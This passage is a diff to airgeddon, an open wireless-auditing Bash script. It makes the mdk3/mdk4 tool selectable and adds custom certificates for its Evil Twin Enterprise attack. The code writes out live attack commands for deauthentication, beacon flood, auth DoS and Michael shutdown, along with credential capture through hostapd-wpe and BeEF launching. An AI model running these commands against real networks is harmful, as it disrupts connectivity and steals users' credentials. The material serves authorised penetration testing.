+		wait_for_process "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack"
 	fi
 }
 
@@ -3953,8 +4314,8 @@ function exec_authdos() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"auth dos attack\"" "mdk4 ${interface} a -a ${bssid} -m -s 1024" "auth dos attack" "active"
-		wait_for_process "mdk4 ${interface} a -a ${bssid} -m -s 1024" "auth dos attack"
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m -s 1024" "auth dos attack" "active"
+		wait_for_process "${mdk_command} ${interface} a -a ${bssid} -m -s 1024" "auth dos attack"
 	fi
 }
 
@@ -3981,13 +4342,13 @@ function exec_michaelshutdown() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "mdk4 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack" "active"
-		wait_for_process "mdk4 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack" "active"
+		wait_for_process "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
 	fi
 }
 
-#Validate Mdk4 parameters
-function mdk4_deauth_option() {
+#Validate mdk parameters
+function mdk_deauth_option() {
 
 	debug_print
 
@@ -4018,7 +4379,42 @@ function mdk4_deauth_option() {
 		dos_pursuit_mode=1
 	fi
 
-	exec_mdk4deauth
+	exec_mdkdeauth
+}
+
+#Switch mdk version
+function mdk_version_toggle() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		sed -ri "s:(AIRGEDDON_MDK_VERSION)=(mdk3):\1=mdk4:" "${scriptfolder}${rc_file}" 2> /dev/null
+		AIRGEDDON_MDK_VERSION="mdk4"
+	else
+		sed -ri "s:(AIRGEDDON_MDK_VERSION)=(mdk4):\1=mdk3:" "${scriptfolder}${rc_file}" 2> /dev/null
+		AIRGEDDON_MDK_VERSION="mdk3"
+	fi
+
+	set_mdk_version
+}
+
+#Set mdk to selected version validating its existence
+function set_mdk_version() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		if ! hash mdk3 2> /dev/null; then
+			echo
+			language_strings "${language}" 636 "red"
+			exit_code=1
+			exit_script_option
+		else
+			mdk_command="mdk3"
+		fi
+	else
+		mdk_command="mdk4"
+	fi
 }
 
 #Validate Aireplay parameters
@@ -4328,6 +4724,8 @@ function print_options() {
 		language_strings "${language}" 595 "blue"
 	fi
 
+	language_strings "${language}" 641 "blue"
+
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		language_strings "${language}" 618 "blue"
 	else
@@ -4597,29 +4995,31 @@ function initialize_menu_options_dependencies() {
 
 	debug_print
 
-	clean_handshake_dependencies=(${optional_tools_names[0]})
-	aircrack_attacks_dependencies=(${optional_tools_names[1]})
-	aireplay_attack_dependencies=(${optional_tools_names[2]})
-	mdk4_attack_dependencies=(${optional_tools_names[3]})
-	hashcat_attacks_dependencies=(${optional_tools_names[4]})
-	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
-	et_sniffing_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]})
-	et_sniffing_sslstrip_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]} ${optional_tools_names[10]})
-	et_captive_portal_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[11]})
-	wash_scan_dependencies=(${optional_tools_names[13]})
-	reaver_attacks_dependencies=(${optional_tools_names[14]})
-	bully_attacks_dependencies=(${optional_tools_names[15]} ${optional_tools_names[17]})
-	bully_pixie_dust_attack_dependencies=(${optional_tools_names[15]} ${optional_tools_names[16]} ${optional_tools_names[17]})
-	reaver_pixie_dust_attack_dependencies=(${optional_tools_names[14]} ${optional_tools_names[16]})
-	et_sniffing_sslstrip2_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[18]} ${optional_tools_names[19]})
-	wep_attack_dependencies=(${optional_tools_names[2]} ${optional_tools_names[20]})
-	enterprise_attack_dependencies=(${optional_tools_names[21]} ${optional_tools_names[22]})
-	asleap_attacks_dependencies=(${optional_tools_names[22]})
-	john_attacks_dependencies=(${optional_tools_names[23]})
-	johncrunch_attacks_dependencies=(${optional_tools_names[23]} ${optional_tools_names[1]})
+	clean_handshake_dependencies=("${optional_tools_names[0]}")
+	aircrack_attacks_dependencies=("${optional_tools_names[1]}")
+	aireplay_attack_dependencies=("${optional_tools_names[2]}")
+	mdk_attack_dependencies=("${optional_tools_names[3]}")
+	hashcat_attacks_dependencies=("${optional_tools_names[4]}")
+	et_onlyap_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}")
+	et_sniffing_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[8]}" "${optional_tools_names[9]}")
+	et_sniffing_sslstrip_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[8]}" "${optional_tools_names[9]}" "${optional_tools_names[10]}")
+	et_captive_portal_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[11]}")
+	wash_scan_dependencies=("${optional_tools_names[13]}")
+	reaver_attacks_dependencies=("${optional_tools_names[14]}")
+	bully_attacks_dependencies=("${optional_tools_names[15]}" "${optional_tools_names[17]}")
+	bully_pixie_dust_attack_dependencies=("${optional_tools_names[15]}" "${optional_tools_names[16]}" "${optional_tools_names[17]}")
+	reaver_pixie_dust_attack_dependencies=("${optional_tools_names[14]}" "${optional_tools_names[16]}")
+	et_sniffing_sslstrip2_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[18]}" "${optional_tools_names[19]}")
+	wep_attack_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[20]}")
+	enterprise_attack_dependencies=("${optional_tools_names[21]}" "${optional_tools_names[22]}" "${optional_tools_names[24]}")
+	asleap_attacks_dependencies=("${optional_tools_names[22]}")
+	john_attacks_dependencies=("${optional_tools_names[23]}")
+	johncrunch_attacks_dependencies=("${optional_tools_names[23]}" "${optional_tools_names[1]}")
+	enterprise_certificates_dependencies=("${optional_tools_names[24]}")
 }
 
 #Set possible changes for some commands that can be found in different ways depending of the O.S.
+#shellcheck disable=SC2206
 function set_possible_aliases() {
 
 	debug_print
@@ -4629,12 +5029,36 @@ function set_possible_aliases() {
 			arraliases=(${possible_alias_names[${item//[[:space:]]/ }]})
 			for item2 in "${arraliases[@]}"; do
 				if hash "${item2}" 2> /dev/null; then
-					optional_tools_names=(${optional_tools_names[@]/${item}/${item2}})
+					optional_tools_names=(${optional_tools_names[@]/${item}/"${item2}"})
 					break
 				fi
 			done
 		fi
 	done
+}
+
+#Modify dependencies arrays depending on selected options
+function dependencies_modifications() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		essential_tools_names=("${essential_tools_names[@]/xterm/tmux}")
+		possible_package_names[${essential_tools_names[7]}]="tmux"
+		unset possible_package_names["xterm"]
+	fi
+
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		optional_tools_names=("${optional_tools_names[@]/mdk4/mdk3}")
+		possible_package_names[${optional_tools_names[3]}]="mdk3"
+		unset possible_package_names["mdk4"]
+	fi
+
+	if [ "${iptables_nftables}" -eq 0 ]; then
+		optional_tools_names=("${optional_tools_names[@]/nft/iptables}")
+		possible_package_names[${optional_tools_names[7]}]="iptables"
+		unset possible_package_names["nftables"]
+	fi
 }
 
 #Initialize optional_tools values
@@ -4756,7 +5180,7 @@ function clean_env_vars() {
 
 	debug_print
 
-	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_FORCE_IPTABLES AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE AIRGEDDON_WINDOWS_HANDLING
+	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_FORCE_IPTABLES AIRGEDDON_MDK_VERSION AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE AIRGEDDON_WINDOWS_HANDLING
 }
 
 #Clean temporary files
@@ -4788,6 +5212,7 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${asleap_pot_tmp}" > /dev/null 2>&1
 	if [ "${dhcpd_path_changed}" -eq 1 ]; then
@@ -5134,6 +5559,8 @@ function enterprise_attacks_menu() {
 	language_strings "${language}" 55
 	language_strings "${language}" 56
 	language_strings "${language}" 49
+	language_strings "${language}" 627 "separator"
+	language_strings "${language}" 628 enterprise_certificates_dependencies[@]
 	language_strings "${language}" 117 "separator"
 	language_strings "${language}" 260 enterprise_attack_dependencies[@]
 	language_strings "${language}" 248 "separator"
@@ -5158,19 +5585,9 @@ function enterprise_attacks_menu() {
 			explore_for_targets_option "WPA" "enterprise"
 		;;
 		5)
-			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
-				forbidden_menu_option
-			else
-				current_iface_on_messages="${interface}"
-				if check_interface_wifi "${interface}"; then
-					enterprise_mode="smooth"
-					et_dos_menu "enterprise"
-				else
-					echo
-					language_strings "${language}" 281 "red"
-					language_strings "${language}" 115 "read"
-				fi
-			fi
+			custom_certificates_questions
+			create_certificates_config_files
+			create_custom_certificates
 		;;
 		6)
 			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
@@ -5178,8 +5595,27 @@ function enterprise_attacks_menu() {
 			else
 				current_iface_on_messages="${interface}"
 				if check_interface_wifi "${interface}"; then
-					enterprise_mode="noisy"
-					et_dos_menu "enterprise"
+					if custom_certificates_integration; then
+						enterprise_mode="smooth"
+						et_dos_menu "enterprise"
+					fi
+				else
+					echo
+					language_strings "${language}" 281 "red"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		7)
+			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				current_iface_on_messages="${interface}"
+				if check_interface_wifi "${interface}"; then
+					if custom_certificates_integration; then
+						enterprise_mode="noisy"
+						et_dos_menu "enterprise"
+					fi
 				else
 					echo
 					language_strings "${language}" 281 "red"
@@ -7104,6 +7540,44 @@ function manage_enterprise_log() {
 	done
 }
 
+#Check to save certs for Evil Twin Enterprise attack
+function manage_enterprise_certs() {
+
+	debug_print
+
+	enterprisecertspath=$(env | grep ^HOME | awk -F = '{print $2}')
+
+	lastcharenterprisecertspath=${enterprisecertspath: -1}
+	if [ "${lastcharenterprisecertspath}" != "/" ]; then
+		enterprisecertspath="${enterprisecertspath}/"
+	fi
+	enterprisecerts_suggested_dirname="enterprise_certs"
+	enterprisecertspath="${enterprisecertspath}${enterprisecerts_suggested_dirname}/"
+
+	validpath=1
+	while [[ "${validpath}" != "0" ]]; do
+		read_path "certificates"
+	done
+}
+
+#Save created cert files to user's location
+function save_enterprise_certs() {
+
+	debug_print
+
+	if [ ! -d "${enterprisecerts_completepath}" ]; then
+		mkdir -p "${enterprisecerts_completepath}" > /dev/null 2>&1
+	fi
+
+	cp "${tmpdir}${certsdir}server.pem" "${enterprisecerts_completepath}" 2> /dev/null
+	cp "${tmpdir}${certsdir}ca.pem" "${enterprisecerts_completepath}" 2> /dev/null
+	cp "${tmpdir}${certsdir}server.key" "${enterprisecerts_completepath}" 2> /dev/null
+
+	echo
+	language_strings "${language}" 644 "blue"
+	language_strings "${language}" 115 "read"
+}
+
 #Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
 function manage_captive_portal_log() {
 
@@ -7167,7 +7641,7 @@ function parse_from_enterprise() {
 	unset enterprise_captured_challenges_responses
 	declare -gA enterprise_captured_challenges_responses
 
-	readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${tmpdir}${hostapd_wpe_log}" | sort -k 2,2 | uniq --skip-fields=1 2> /dev/null)
+	readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${tmpdir}${hostapd_wpe_log}" | sort -k 2,3 | uniq --skip-fields=1 2> /dev/null)
 	for item in "${CAPTURED_USERNAMES[@]}"; do
 		[[ "${item}" =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="${BASH_REMATCH[1]}" && username="${BASH_REMATCH[2]}"
 		line_to_check=$((line_number + 1))
@@ -7624,6 +8098,10 @@ function exec_enterprise_attack() {
 
 	debug_print
 
+	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
+	mkdir "${tmpdir}${enterprisedir}" > /dev/null 2>&1
+
 	set_hostapd_wpe_config
 	launch_fake_ap
 	exec_et_deauth
@@ -7905,6 +8383,9 @@ function exec_et_captive_portal_attack() {
 
 	debug_print
 
+	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
+	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1
+
 	set_hostapd_config
 	launch_fake_ap
 	set_dhcp_config
@@ -8007,12 +8488,11 @@ function set_hostapd_wpe_config() {
 	echo -e "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user"
 	} >> "${tmpdir}${hostapd_wpe_file}"
 
-	#TODO review certificate options for future versions. For now, using defaults
 	{
-	echo -e "ca_cert=/etc/hostapd-wpe/certs/ca.pem"
-	echo -e "server_cert=/etc/hostapd-wpe/certs/server.pem"
-	echo -e "private_key=/etc/hostapd-wpe/certs/server.key"
-	echo -e "private_key_passwd=whatever"
+	echo -e "ca_cert=${hostapd_wpe_cert_path}ca.pem"
+	echo -e "server_cert=${hostapd_wpe_cert_path}server.pem"
+	echo -e "private_key=${hostapd_wpe_cert_path}server.key"
+	echo -e "private_key_passwd=${hostapd_wpe_cert_pass}"
 	} >> "${tmpdir}${hostapd_wpe_file}"
 }
 
@@ -8315,19 +8795,19 @@ function exec_et_deauth() {
 	prepare_et_monitor
 
 	case ${et_dos_attack} in
-		"Mdk4")
-			kill "$(ps -C mdk4 --no-headers -o pid | tr -d ' ')" &> /dev/null
+		"${mdk_command}")
+			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
-			deauth_et_cmd="mdk4 ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
 		;;
 		"Aireplay")
 			kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
 			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
 		"Wds Confusion")
-			kill "$(ps -C mdk4 --no-headers -o pid | tr -d ' ')" &> /dev/null
-			deauth_et_cmd="mdk4 ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
+			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
 		;;
 	esac
 
@@ -8799,10 +9279,6 @@ function set_wps_attack_script() {
 function set_enterprise_control_script() {
 
 	debug_print
-
-	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
-	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
-	mkdir "${tmpdir}${enterprisedir}" > /dev/null 2>&1
 
 	exec 7>"${tmpdir}${control_enterprise_file}"
 
@@ -9441,9 +9917,6 @@ function set_captive_portal_page() {
 
 	debug_print
 
-	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
-	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1
-
 	{
 	echo -e "body * {"
 	echo -e "\tbox-sizing: border-box;"
@@ -9924,7 +10397,7 @@ function manual_beef_set() {
 				if [ -d "${manually_entered_beef_path}" ]; then
 					if [ -f "${manually_entered_beef_path}beef" ]; then
 						if head "${manually_entered_beef_path}beef" -n 1 2> /dev/null | grep ruby > /dev/null; then
-							possible_beef_known_locations+=(${manually_entered_beef_path})
+							possible_beef_known_locations+=("${manually_entered_beef_path}")
 							valid_possible_beef_path=1
 						else
 							language_strings "${language}" 406 "red"
@@ -9986,6 +10459,7 @@ function start_beef_service() {
 }
 
 #Launch beef browser exploitation framework
+#shellcheck disable=SC2164
 function launch_beef() {
 
 	debug_print
@@ -10002,7 +10476,8 @@ function launch_beef() {
 		cp "${tmpdir}${beef_file}" "${beef_path}" > /dev/null 2>&1
 		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "cd ${beef_path} && ./beef -c \"${beef_file}\"" "BeEF"
 		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-			get_tmux_process_id "cd ${beef_path} && ./beef -c \"${beef_file}\""
+			cd "${beef_path}"
+			get_tmux_process_id "./beef -c \"${beef_file}\""
 			et_processes+=("${global_process_pid}")
 			global_process_pid=""
 		fi
@@ -10180,8 +10655,8 @@ function kill_et_windows() {
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		kill_dos_pursuit_mode_processes
 		case ${et_dos_attack} in
-			"Mdk4"|"Wds Confusion")
-				kill "$(ps -C mdk4 --no-headers -o pid | tr -d ' ')" &> /dev/null
+			"${mdk_command}"|"Wds Confusion")
+				kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
 			;;
 			"Aireplay")
 				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
@@ -10200,6 +10675,7 @@ function kill_et_windows() {
 		kill "${et_process_control_window}" &> /dev/null
 		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
 	fi
+
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 		kill_tmux_windows
 	fi
@@ -10393,13 +10869,13 @@ function dos_attacks_menu() {
 	language_strings "${language}" 56
 	language_strings "${language}" 49
 	language_strings "${language}" 50 "separator"
-	language_strings "${language}" 51 mdk4_attack_dependencies[@]
+	language_strings "${language}" 51 mdk_attack_dependencies[@]
 	language_strings "${language}" 52 aireplay_attack_dependencies[@]
-	language_strings "${language}" 53 mdk4_attack_dependencies[@]
+	language_strings "${language}" 53 mdk_attack_dependencies[@]
 	language_strings "${language}" 54 "separator"
-	language_strings "${language}" 62 mdk4_attack_dependencies[@]
-	language_strings "${language}" 63 mdk4_attack_dependencies[@]
-	language_strings "${language}" 64 mdk4_attack_dependencies[@]
+	language_strings "${language}" 62 mdk_attack_dependencies[@]
+	language_strings "${language}" 63 mdk_attack_dependencies[@]
+	language_strings "${language}" 64 mdk_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " dos_option
@@ -10423,7 +10899,7 @@ function dos_attacks_menu() {
 			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				mdk4_deauth_option
+				mdk_deauth_option
 			fi
 		;;
 		6)
@@ -10482,13 +10958,13 @@ function capture_handshake_evil_twin() {
 	capture_handshake_window
 
 	case ${et_dos_attack} in
-		"Mdk4")
+		"${mdk_command}")
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
 			recalculate_windows_sizes
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"mdk4 amok attack\"" "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "mdk4 amok attack"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
 				processidattack="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -10507,9 +10983,9 @@ function capture_handshake_evil_twin() {
 		;;
 		"Wds Confusion")
 			recalculate_windows_sizes
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "mdk4 ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "mdk4 ${interface} w -e ${essid} -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
 				processidattack="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -10605,7 +11081,7 @@ function validate_path() {
 
 	lastcharmanualpath=${1: -1}
 
-	if [ "${2}" = "enterprisepot" ]; then
+	if [[ "${2}" = "enterprisepot" ]] || [[ "${2}" = "certificates" ]]; then
 		dirname=$(dirname "${1}")
 
 		if [ -d "${dirname}" ]; then
@@ -10637,7 +11113,7 @@ function validate_path() {
 		fi
 	fi
 
-	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]] || [[ "${2}" = "enterprisepot" ]]; then
+	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]] || [[ "${2}" = "enterprisepot" ]] || [[ "${2}" = "certificates" ]]; then
 		if [ "${lastcharmanualpath}" != "/" ]; then
 			pathname="${1}/"
 		else
@@ -10704,6 +11180,23 @@ function validate_path() {
 					if [ "${enterprise_potpath: -1}" != "/" ]; then
 						enterprise_completepath+="/"
 					fi
+				fi
+
+				echo
+				language_strings "${language}" 158 "yellow"
+				return 0
+			;;
+			"certificates")
+				enterprisecertspath="${pathname}"
+				enterprisecerts_basepath=$(dirname "${enterprisecertspath}")
+
+				if [ "${enterprisecerts_basepath}" != "/" ]; then
+					enterprisecerts_basepath+="/"
+				fi
+
+				enterprisecerts_completepath="${enterprisecertspath}"
+				if [ "${enterprisecertspath: -1}" != "/" ]; then
+					enterprisecerts_completepath+="/"
 				fi
 
 				echo
@@ -10904,6 +11397,14 @@ function read_path() {
 			fi
 			validate_path "${enterprisepotenteredpath}" "${1}"
 		;;
+		"certificates")
+			language_strings "${language}" 643 "blue"
+			read_and_clean_path "certificatesenteredpath"
+			if [ -z "${certificatesenteredpath}" ]; then
+				certificatesenteredpath="${enterprisecertspath}"
+			fi
+			validate_path "${certificatesenteredpath}" "${1}"
+		;;
 	esac
 
 	validpath="$?"
@@ -10954,9 +11455,9 @@ function attack_handshake_menu() {
 	print_simple_separator
 	language_strings "${language}" 147
 	print_simple_separator
-	language_strings "${language}" 139 mdk4_attack_dependencies[@]
+	language_strings "${language}" 139 mdk_attack_dependencies[@]
 	language_strings "${language}" 140 aireplay_attack_dependencies[@]
-	language_strings "${language}" 141 mdk4_attack_dependencies[@]
+	language_strings "${language}" 141 mdk_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " attack_handshake_option
@@ -10974,9 +11475,9 @@ function attack_handshake_menu() {
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
 				recalculate_windows_sizes
-				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"mdk4 amok attack\"" "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "mdk4 amok attack"
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-					get_tmux_process_id "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
+					get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
 					processidattack="${global_process_pid}"
 					global_process_pid=""
 				fi
@@ -11009,9 +11510,9 @@ function attack_handshake_menu() {
 				ask_timeout "capture_handshake"
 				capture_handshake_window
 				recalculate_windows_sizes
-				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "mdk4 ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-					get_tmux_process_id "mdk4 ${interface} w -e ${essid} -c ${channel}"
+					get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
 					processidattack="${global_process_pid}"
 					global_process_pid=""
 				fi
@@ -11853,9 +12354,9 @@ function et_dos_menu() {
 		language_strings "${language}" 266
 	fi
 	print_simple_separator
-	language_strings "${language}" 139 mdk4_attack_dependencies[@]
+	language_strings "${language}" 139 mdk_attack_dependencies[@]
 	language_strings "${language}" 140 aireplay_attack_dependencies[@]
-	language_strings "${language}" 141 mdk4_attack_dependencies[@]
+	language_strings "${language}" 141 mdk_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " et_dos_option
@@ -11870,7 +12371,7 @@ function et_dos_menu() {
 			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				et_dos_attack="Mdk4"
+				et_dos_attack="${mdk_command}"
 
 				echo
 				language_strings "${language}" 509 "yellow"
@@ -12347,7 +12848,7 @@ function iptables_nftables_detection() {
 	debug_print
 
 	if ! "${AIRGEDDON_FORCE_IPTABLES:-false}"; then
-		if hash nft  2> /dev/null; then
+		if hash nft 2> /dev/null; then
 			iptables_nftables=1
 		else
 			iptables_nftables=0
@@ -12645,9 +13146,11 @@ function update_options_config_file() {
 			for item in "${OPTION_VARS[@]}"; do
 				option_name="${item%=*}"
 				option_value="${item#*=}"
-				if [[ "${ordered_options_env_vars[@]}" =~ ${option_name} ]]; then
-					sed -ri "s:(${option_name})=(.+):\1=${option_value}:" "${scriptfolder}${rc_file}" 2> /dev/null
-				fi
+				for item2 in "${ordered_options_env_vars[@]}"; do
+					if [ "${item2}" = "${option_name}" ]; then
+						sed -ri "s:(${option_name})=(.+):\1=${option_value}:" "${scriptfolder}${rc_file}" 2> /dev/null
+					fi
+				done
 			done
 		;;
 	esac
@@ -13078,6 +13581,7 @@ function check_root_permissions() {
 }
 
 #Print Linux known distros
+#shellcheck disable=SC2207
 function print_known_distros() {
 
 	debug_print
@@ -13404,6 +13908,12 @@ function initialize_script_settings() {
 	declare -gA wps_data_array
 	declare -gA interfaces_band_info
 	tmux_error=0
+	custom_certificates_country=""
+	custom_certificates_state=""
+	custom_certificates_locale=""
+	custom_certificates_organization=""
+	custom_certificates_email=""
+	custom_certificates_cn=""
 }
 
 #Detect if there is a working X window system excepting for docker container and wayland
@@ -13562,15 +14072,18 @@ function env_vars_initialization() {
 									"AIRGEDDON_PRINT_HINTS"
 									"AIRGEDDON_5GHZ_ENABLED"
 									"AIRGEDDON_FORCE_IPTABLES"
+									"AIRGEDDON_MDK_VERSION"
 									"AIRGEDDON_DEVELOPMENT_MODE"
 									"AIRGEDDON_DEBUG_MODE"
 									"AIRGEDDON_WINDOWS_HANDLING"
 									)
 
 	declare -gA nonboolean_options_env_vars
-	nonboolean_options_env_vars["${ordered_options_env_vars[11]},default_value"]="xterm"
